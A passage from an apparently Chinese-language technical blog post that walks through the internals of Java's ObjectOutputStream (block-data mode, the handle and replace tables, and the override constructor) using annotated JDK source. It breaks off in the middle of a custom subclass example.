class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&#123;<span class="doctag">@code</span> writeObject&#125; 方法负责写出该类自己那一部分的对象状态，</span></span><br><span class="line"><span class="comment"> * 以便对应的 &#123;<span class="doctag">@code</span> readObject&#125; 能正确恢复。</span></span><br><span class="line"><span class="comment"> * 它**无需关心**超类或子类的状态；通常通过在 &#123;<span class="doctag">@code</span> ObjectOutputStream&#125; 上</span></span><br><span class="line"><span class="comment"> * 逐个写出字段（可再次调用 &#123;<span class="doctag">@code</span> writeObject&#125;，或使用 DataOutput 支持的原始类型写法）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;未实现 &#123;<span class="doctag">@link</span> java.io.Serializable&#125; 的类，其字段**不会被写出**。</span></span><br><span class="line"><span class="comment"> * 但**不可序列化类的子类**仍然可以是可序列化的——此时，不可序列化的父类必须提供**无参构造器**</span></span><br><span class="line"><span class="comment"> * 以便在反序列化时初始化其字段；同时由**子类**负责保存/恢复该父类的必要状态</span></span><br><span class="line"><span class="comment"> * （常见做法是父类字段可访问，或提供 getter/setter 以便恢复）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;若希望**阻止**某对象被序列化，可在类中实现 &#123;<span class="doctag">@code</span> writeObject&#125;/&#123;<span class="doctag">@code</span> readObject&#125;</span></span><br><span class="line"><span class="comment"> * 并直接抛出 &#123;<span class="doctag">@link</span> java.io.NotSerializableException&#125;；该异常会被 ObjectOutputStream 捕获，</span></span><br><span class="line"><span class="comment"> * 并中止序列化流程。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现 &#123;<span class="doctag">@link</span> java.io.Externalizable&#125; 接口则让对象对其序列化格式与内容拥有**完全控制权**。</span></span><br><span class="line"><span class="comment"> * 框架会调用 &#123;<span class="doctag">@code</span> writeExternal&#125;/&#123;<span class="doctag">@code</span> readExternal&#125; 保存与恢复对象状态；</span></span><br><span class="line"><span class="comment"> * 类可以使用 &#123;<span class="doctag">@link</span> java.io.ObjectOutput&#125; / &#123;<span class="doctag">@link</span> java.io.ObjectInput&#125; 的所有方法</span></span><br><span class="line"><span class="comment"> * 自行读写。版本演进（versioning）也需要由对象自行处理。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;枚举常量（enum）的序列化与普通（可序列化/外部化）对象不同：</span></span><br><span class="line"><span class="comment"> * 序列化形式**只包含其名称**（&#123;<span class="doctag">@code</span> name()&#125; 的返回值），常量上的字段值不会被传输。</span></span><br><span class="line"><span class="comment"> * 与其他对象一样，枚举常量也可以作为后续回引用（back reference）的目标。</span></span><br><span class="line"><span class="comment"> * 枚举类型的序列化过程**不可自定义**：枚举类中定义的任何 &#123;<span class="doctag">@code</span> writeObject&#125;/&#123;<span class="doctag">@code</span> writeReplace&#125;</span></span><br><span class="line"><span class="comment"> * 都会在序列化时被忽略；同样，任何 &#123;<span class="doctag">@code</span> serialPersistentFields&#125; 或 &#123;<span class="doctag">@code</span> serialVersionUID&#125;</span></span><br><span class="line"><span class="comment"> * 声明也会被忽略——**所有枚举类型的 &#123;<span class="doctag">@code</span> serialVersionUID&#125; 固定为 0L**。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;除可序列化字段与 Externalizable 数据外，其余**原始数据**会以**块数据（block-data）记录**</span></span><br><span class="line"><span class="comment"> * 写入到 ObjectOutputStream 中。每个块数据记录由一个**头部**（标记 + 后续字节数）和数据体组成；</span></span><br><span class="line"><span class="comment"> * **连续的原始类型写入会被聚合**到同一块记录。块数据记录的默认**分块大小**为 1024 字节；</span></span><br><span class="line"><span class="comment"> * 每条记录会尽量填满至 1024 字节，或在“退出块数据模式”时被立刻写出。</span></span><br><span class="line"><span class="comment"> * 调用 &#123;<span class="doctag">@code</span> writeObject&#125;、&#123;<span class="doctag">@code</span> defaultWriteObject&#125; 与 &#123;<span class="doctag">@code</span> writeFields&#125;</span></span><br><span class="line"><span class="comment"> * 会**首先终止**（flush/切断）当前仍在聚合的块数据记录。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Mike Warres</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Roger Riggs</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.DataOutput</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectInputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.Serializable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.Externalizable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> &lt;a href=&quot;../../../platform/serialization/spec/output.html&quot;&gt;</span></span><br><span class="line"><span class="comment"> *      Object Serialization Specification, Section 2, Object Output Classes&lt;/a&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectOutputStream</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">OutputStream</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">ObjectOutput</span>, ObjectStreamConstants &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="块输出流：BlockDataOutputStream-bout"><a href="#块输出流：BlockDataOutputStream-bout" class="headerlink" title="块输出流：BlockDataOutputStream bout"></a>块输出流：BlockDataOutputStream bout</h4><p><code>ObjectOutputStream</code>（OOS）并不直接往你提供的 <code>OutputStream out</code> 写字节，而是把它再包一层成 <strong><code>BlockDataOutputStream bout</code><strong>，所有写入</strong>最终</strong>都流经 <code>bout</code>。</p>
<p>你可以把它想成：<code>OOS</code> 管“组织与语法”（写什么标记、什么时候进入字段区），<code>bout</code> 管“物理出流”（是否包成块、如何加长度头、什么时候冲刷缓冲区）。</p>
<p><code>BlockDataOutputStream</code> 在数据写入时有两种模式：</p>
<ul>
<li><p><strong>结构化标记直写（非块模式）</strong>：<code>TC_OBJECT / TC_CLASSDESC / TC_REFERENCE / TC_NULL / TC_ENUM / TC_ARRAY / TC_STRING / TC_LONGSTRING / TC_ENDBLOCKDATA ...</code> 这些协议“标签”需要在<strong>非块模式</strong>下逐条写，保证接收端按标记边界解析。此时 <code>bout.writeByte(x)</code> 就是直接把 <code>x</code> 发到下游，不做块封装。</p>
</li>
<li><p><strong>原始字节聚合（块数据模式）</strong>：把原始类型（<code>byte</code>&#x2F;<code>int</code>&#x2F;<code>long</code>…）或一段“注解&#x2F;外部化数据”<strong>攒成一个块</strong>后一次性写出（<code>TC_BLOCKDATA</code> 或 <code>TC_BLOCKDATALONG</code> + 长度 + 内容），减少碎片化与边界处理的开销。</p>
</li>
</ul>
<p>两种模式是通过 <code>setBlockDataMode</code> 方法进行切换的：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">old</span> <span class="operator">=</span> bout.setBlockDataMode(newMode);</span><br></pre></td></tr></table></figure></div>

<p><code>setBlockDataMode</code> 函数实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“块数据模式”设置为给定值（true=开，false=关），并**返回切换前的模式值**。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义说明：</span></span><br><span class="line"><span class="comment"> * - 若新旧模式相同：不做任何事，直接返回当前模式值（等于旧模式）。</span></span><br><span class="line"><span class="comment"> * - 若新旧模式不同：先把缓冲区中**尚未写出的字节**全部冲刷（drain），</span></span><br><span class="line"><span class="comment"> *   再切换模式；最后返回“旧模式值”，以便调用方在 finally 中恢复。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型用法：</span></span><br><span class="line"><span class="comment"> *   boolean old = bout.setBlockDataMode(true);</span></span><br><span class="line"><span class="comment"> *   try &#123;</span></span><br><span class="line"><span class="comment"> *       // 在块模式下写原始字节（字段、注解、external 数据等）</span></span><br><span class="line"><span class="comment"> *   &#125; finally &#123;</span></span><br><span class="line"><span class="comment"> *       bout.setBlockDataMode(old);   // 恢复进入前的模式</span></span><br><span class="line"><span class="comment"> *   &#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mode  目标模式（true=进入块模式；false=退出块模式）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>      切换**之前**的模式值（供调用方保存/恢复）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 若目标模式与当前模式一致：无须操作，直接返回当前（也即“旧的”）模式值</span></span><br><span class="line">    <span class="keyword">if</span> (blkmode == mode) &#123;</span><br><span class="line">        <span class="keyword">return</span> blkmode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模式发生切换前：必须将缓冲中的数据写出</span></span><br><span class="line">    <span class="comment">// 这样可以确保“块区内容”与“结构化标记”严格分段，不会黏连在一起导致读端误读</span></span><br><span class="line">    drain();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 真正切换到新模式</span></span><br><span class="line">    blkmode = mode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回“旧模式值”</span></span><br><span class="line">    <span class="comment">// 由于上面刚把 blkmode 设为了新的 mode，因此 !blkmode 等于“切换前的模式”</span></span><br><span class="line">    <span class="comment">// （如果你觉得易混淆，可以理解为：old = (blkmode 设新值前的值)）</span></span><br><span class="line">    <span class="keyword">return</span> !blkmode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将当前缓冲区（buf[0..pos)）中的**所有字节**写入到底层输出流 out，</span></span><br><span class="line"><span class="comment"> * 但**不**调用 out.flush()（不强制冲刷底层流）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 行为细节：</span></span><br><span class="line"><span class="comment"> * - 若 pos==0：缓冲为空，直接返回。</span></span><br><span class="line"><span class="comment"> * - 若当前处于“块模式”（blkmode==true）：</span></span><br><span class="line"><span class="comment"> *     * 先写入“块头”（TC_BLOCKDATA/TC_BLOCKDATALONG + 长度=pos），</span></span><br><span class="line"><span class="comment"> *       再把 buf 中的 pos 个字节写出；读端据此按长度精确读取该块。</span></span><br><span class="line"><span class="comment"> * - 若当前处于“非块模式”（blkmode==false）：</span></span><br><span class="line"><span class="comment"> *     * 直接把 buf 中的字节原样写出（非块模式下缓冲仅作聚合小写/减少 syscall）。</span></span><br><span class="line"><span class="comment"> * - 最后将 pos 置 0，表示缓冲已清空。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型调用时机：</span></span><br><span class="line"><span class="comment"> * - 模式切换前（setBlockDataMode 内部会先 drain 再切模式）。</span></span><br><span class="line"><span class="comment"> * - 内部缓冲写满时（上层写入导致 pos 达到阈值）。</span></span><br><span class="line"><span class="comment"> * - 某些显式 flush/收尾动作之前（但本方法本身不 flush 底层 out）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;                <span class="comment">// 无数据可写，直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (blkmode) &#123;</span><br><span class="line">        <span class="comment">// 在块模式下，必须先输出块头，告知读端本次紧随其后的块长度</span></span><br><span class="line">        writeBlockHeader(pos);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将缓冲内容写入底层输出流（不调用 out.flush()）</span></span><br><span class="line">    out.write(buf, <span class="number">0</span>, pos);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空缓冲计数</span></span><br><span class="line">    pos = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>从 true → false</strong>（离开块模式）：<br>先把<strong>缓冲里攒的块</strong>全部“<strong>冲刷成一个或多个 TC_BLOCKDATA&#x2F;TC_BLOCKDATALONG</strong>”发出去（这一步叫 drain&#x2F;flush），然后切到非块模式，接下来就可以安全地写结构化标记（比如 <code>TC_ENDBLOCKDATA</code>、<code>TC_OBJECT</code> 等）。</li>
<li><strong>从 false → true</strong>（进入块模式）：<br>简单地把模式置为“攒块”状态；接下来的原始字节会先进入缓冲，必要时再封成块吐出。</li>
</ul>
<p>OOS 会在<strong>不同语义段</strong>之间自动切换，常见场景：</p>
<ul>
<li><strong>写对象头&#x2F;类描述&#x2F;引用&#x2F;null</strong> → <strong>非块模式</strong><br>这些是<strong>结构化标记</strong>，不能包进块里。</li>
<li><strong>写默认字段（primitive 值）&#x2F;注解区&#x2F;Externalizable 数据</strong> → <strong>块模式</strong><br>这些是<strong>原始字节</strong>，攒成块更高效。</li>
<li><strong>在块模式里突然要写“对象引用类型字段”</strong>（比如字段是 <code>String</code> 或其他对象）：<br>OOS 会<strong>先把当前块 flush 出去</strong>（保持边界清晰），再临时切到<strong>非块模式</strong>写 <code>TC_STRING/TC_OBJECT/...</code> 等结构；写完又回到<strong>块模式</strong>继续攒后面的原始字节。</li>
</ul>
<h4 id="对象句柄表：HandleTable-handles"><a href="#对象句柄表：HandleTable-handles" class="headerlink" title="对象句柄表：HandleTable handles"></a>对象句柄表：HandleTable handles</h4><p>对象句柄表维护“<strong>对象实例 → 句柄ID</strong>（int，下标）”的映射，用于：</p>
<ul>
<li><strong>共享引用</strong>：同一对象实例在对象图里出现多次时，<strong>只首写一次</strong>，后续都用 <code>TC_REFERENCE</code> 回指，保持别名关系并节省体积。</li>
<li><strong>循环引用</strong>：对象自指或环状结构时，先登记一个“句柄”，再写其内部字段，避免无限递归。</li>
</ul>
<blockquote>
<p>句柄（handle）可以理解为“<strong>写端的对象编号</strong>”。写到线上的编号会再加一个固定偏移（<code>baseWireHandle=0x7E0000</code>）变成“<strong>线上句柄ID</strong>”。</p>
</blockquote>
<p>对象句柄表主要有下面两个相关函数：</p>
<ul>
<li><code>lookup(obj)</code>：找句柄ID；无则 <code>-1</code>。</li>
<li><code>assign(obj)</code>：为首次写出的对象分配句柄；</li>
</ul>
<p>一个对象是否可以被引用取决于 <code>unshared</code> 变量。<code>unshared</code> 来自于 <code>writeObject0</code> 的参数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException;</span><br></pre></td></tr></table></figure></div>

<p>具体来说是来自于 <code>writeUnshared(obj)</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeUnshared</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        writeObject0(obj, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            writeFatalException(ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>意思是“本次写这个对象，不参与共享。以后就算再遇到<strong>同一个实例</strong>，也<strong>不要用 <code>TC_REFERENCE</code> 回指</strong>，而是<strong>当成新对象重写</strong>。”</p>
<p>序列化过程中会针对一个对象是否支持可引用（<code>unshared</code>）进行判断，例如：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handles.assign(unshared ? <span class="literal">null</span> : cl);</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (handle = handles.lookup(desc)) != -<span class="number">1</span>) &#123;</span><br><span class="line">    writeHandle(handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="对象替换表：ReplaceTable-subs"><a href="#对象替换表：ReplaceTable-subs" class="headerlink" title="对象替换表：ReplaceTable subs"></a>对象替换表：ReplaceTable subs</h4><p>序列化前，JDK 允许对象被“<strong>替换</strong>”成另外一个对象来写出，常见用途：</p>
<ul>
<li>**类私有 <code>writeReplace()</code>**：类作者用“序列化代理（serialization proxy）”维持不变量。<br>例：某些集合&#x2F;包装类把自己替换为更简单稳定的代理对象，避免把内部结构直接写出去。</li>
<li>**全局替换钩子 <code>replaceObject(obj)</code>**：只有 <strong>自定义 OOS 子类</strong> 显式 <code>enableReplaceObject(true)</code> 后才启用，可用于做统一的过滤、包装、脱敏等。</li>
</ul>
<p>在对象替换过程中，<code>ReplaceTable</code> 具体负责：</p>
<ul>
<li>保证<strong>替换稳定性与幂等</strong>：同一个“原对象（orig）”只要替换过一次，之后<strong>再遇到它</strong>，都应替换为<strong>同一个</strong>“替代对象（rep）”。<br>否则：第一次遇到 A → 替成 B；第二次遇到 A 又变成 C，就会破坏对象图一致性、干扰共享&#x2F;回指。</li>
<li>让“替换后的对象”参与后续的<strong>句柄共享</strong>与快速路径判断：把 A→B 的映射记录后，再次遇到 A，立即视为 B，因而可能直接命中 <code>handles</code>、写 <code>TC_REFERENCE</code>，或者走 <code>Class/OSC/String/...</code> 特例。</li>
</ul>
<h3 id="ObjectOutputStream-构造函数"><a href="#ObjectOutputStream-构造函数" class="headerlink" title="ObjectOutputStream 构造函数"></a>ObjectOutputStream 构造函数</h3><p>当我们实例化 <code>ObjectOutputStream</code> 并传入参数后，首先调用的是 <code>ObjectOutputStream</code> 的构造方法。</p>
<p><code>ObjectOutputStream</code> 构造方法有两个，一个是 <code>public</code> 的单参数构造函数，一个是 <code>protected</code> 的无参构造函数。</p>
<h4 id="无参构造函数"><a href="#无参构造函数" class="headerlink" title="无参构造函数"></a>无参构造函数</h4><p>无参构造函数定义如下，该函数主要用于当用户完全自定义实现 <code>ObjectOutputStream</code> 的子类时使用。此时由于不使用 JDK 默认实现的数据结构&#x2F;协议，因此构造函数中对 <code>ObjectOutputStream</code> 自身的数据结构不作初始化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 供**完全重实现**（re-implement）ObjectOutputStream 的子类使用的构造器。</span></span><br><span class="line"><span class="comment"> * 使用该构造器的子类可以**不分配**本实现所需的私有内部结构（如句柄表、替换表等），</span></span><br><span class="line"><span class="comment"> * 自行管理序列化格式与写出逻辑。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;安全管理器（SecurityManager）说明：</span></span><br><span class="line"><span class="comment"> * 若系统安装了 SecurityManager，本方法首先会调用</span></span><br><span class="line"><span class="comment"> * SecurityManager.checkPermission(new SerializablePermission(&quot;enableSubclassImplementation&quot;))</span></span><br><span class="line"><span class="comment"> * 以确保允许启用“子类自定义实现”能力；否则抛出 SecurityException。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;注意：使用该构造器意味着**不会自动写入流头部**，也不会初始化本类的内部状态；</span></span><br><span class="line"><span class="comment"> * 子类应自行决定何时/如何写入头部、如何组织块数据模式、如何管理句柄与替换等。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException 若安全管理器拒绝启用“子类自定义实现”</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException       创建流过程中发生的 I/O 错误（本实现中通常不会触发）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> SecurityManager#checkPermission</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.SerializablePermission</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">ObjectOutputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException, SecurityException &#123;</span><br><span class="line">    <span class="comment">// 若存在安全管理器，先校验是否具有“允许子类自定义实现”的权限。</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">sm</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">        sm.checkPermission(SUBCLASS_IMPLEMENTATION_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用无参构造器时，不分配本实现的内部资源，统一置空；</span></span><br><span class="line">    <span class="comment">// 由子类自行负责序列化数据的组织与写出。</span></span><br><span class="line">    bout = <span class="literal">null</span>;      <span class="comment">// 不建立 BlockDataOutputStream 包装</span></span><br><span class="line">    handles = <span class="literal">null</span>;   <span class="comment">// 不建立句柄表</span></span><br><span class="line">    subs = <span class="literal">null</span>;      <span class="comment">// 不建立替换表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开启“子类接管”模式：表明当前实例由子类**完全重写**核心行为。</span></span><br><span class="line">    enableOverride = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调试栈同样不初始化，子类可按需提供自己的调试/诊断机制。</span></span><br><span class="line">    debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外无参构造函数还会设置 <code>enableOverride = true</code>，这表示用户实现的子类完全接管 <code>ObjectOutputStream</code> 的 <code>writeObject</code> 函数，此时子类只需要实现 <code>writeObjectOverride</code> 函数，父类的 <code>writeObject</code> 函数会直接调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>例如下面这个实例，<code>SimpleObjectOutputStream</code> 完全接管父类的序列化行为，并且在 <code>writeObjectOverride</code> 函数中实现了自己的逻辑。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleObjectOutputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectOutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> OutputStream out;</span><br><span class="line"></span><br><span class="line">    SimpleObjectOutputStream(OutputStream out) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(); <span class="comment">// 关键：启用 enableOverride=true，不创建父类内部结构</span></span><br><span class="line">        <span class="built_in">this</span>.out = Objects.requireNonNull(out);</span><br><span class="line">        writeStreamHeader(); <span class="comment">// 自己决定何时写头</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 自定义魔数 + 版本</span></span><br><span class="line">        out.write(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;S&#x27;</span>, <span class="number">0x01</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeObjectOverride</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String s) &#123;</span><br><span class="line">            out.write(<span class="number">0x01</span>); <span class="comment">// 自定义类型标记：字符串</span></span><br><span class="line">            <span class="type">byte</span>[] data = s.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">            writeInt(data.length);</span><br><span class="line">            out.write(data);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(<span class="string">&quot;Only String supported in demo&quot;</span>);</span><br><span class="line">        